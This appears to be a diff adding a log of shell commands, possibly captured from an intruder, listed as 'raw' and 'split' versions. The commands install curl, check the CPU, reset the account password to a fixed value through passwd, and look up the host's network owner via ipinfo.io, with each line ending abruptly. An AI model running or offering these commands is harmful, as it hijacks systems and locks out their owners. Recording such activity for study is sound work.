@@ -1,0 +1,7 @@
+Raw Commands:
+apt update && apt install curl -y
+lscpu && echo -e "qqr4vyjB\nqqr4vyjB" | passwd && curl https://ipinfo.io/org --insecure -s && apt
+
+Split Commands:
+apt update && apt install curl -y
+lscpu && echo -e "qqr4vyjB\nqqr4vyjB" | passwd && curl https://ipinfo.io/org --insecure -s && apt
